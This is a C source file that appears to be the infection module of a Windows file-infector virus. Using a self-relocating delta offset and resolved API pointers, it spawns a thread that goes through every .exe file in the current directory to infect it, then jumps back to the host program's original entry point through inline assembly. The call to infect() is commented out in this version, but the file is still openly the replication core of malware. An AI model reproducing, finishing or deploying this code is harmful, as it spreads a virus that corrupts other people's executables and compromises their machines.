#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "checksum_list.h"
#include "code_begin.h"
#include "code_end.h"
#include "data.h"
#include "infect.h"
#include "infection_thread.h"
#include "oep.h"
#include "utility.h"

static DWORD WINAPI run(LPVOID param);

void spawn_infection_thread(void) {
    data_t data;

    if (init_data(&data, (void *)code_begin, (void *)code_end,
                  (void *)spawn_infection_thread) == 0) {
        PRINT_DEBUG("initalized data for thread start, CreateThread diff = 0x%X\n",
                    (int32_t)data.function_list.create_thread - (int32_t)CreateThread);
        HANDLE hThread = data.function_list.create_thread(
            NULL, 0,
            (LPTHREAD_START_ROUTINE)((uint8_t *)run + data.delta_offset), NULL,
            0, NULL);
        if (hThread == INVALID_HANDLE_VALUE) {
            PRINT_DEBUG("could not create thread\n");
        }
    } else {
        PRINT_DEBUG("failed to initialize data\n");
    }
    size_t oep = get_original_entry_point();
    if (oep != OEP_DEFAULT) {
        asm volatile("push %0\nret" : : "r"(oep));
    }
}

static DWORD WINAPI run(LPVOID param) {
    data_t data;
    PRINT_DEBUG("infection thread started\n");

    if (init_data(&data, (void *)code_begin, (void *)code_end,
                  (void *)spawn_infection_thread) == 0) {
        WIN32_FIND_DATAA find_data;
        HANDLE h_find;
        const char search_pattern[8] = {'.', '/', '*', '.', 'e', 'x', 'e', 0};

        memzero(&find_data, sizeof(WIN32_FIND_DATAA));
        h_find = data.function_list.find_first_file_a(search_pattern, &find_data);
        if (h_find != INVALID_HANDLE_VALUE) {
            do {
                PRINT_DEBUG("infecting %s...\n", find_data.cFileName);
                /*if (infect(find_data.cFileName, &data) == 0)
                    PRINT_DEBUG("success!\n");
                else {
                    PRINT_DEBUG("failure!\n");
                }*/
            } while (data.function_list.find_next_file_a(h_find, &find_data));
            data.function_list.find_close(h_find);
        }
    } else {
        PRINT_DEBUG("failed to initialize data\n");
    }
    PRINT_DEBUG("infection thread finished\n");
    // data.function_list.exit_process(0);
    return 0;
}
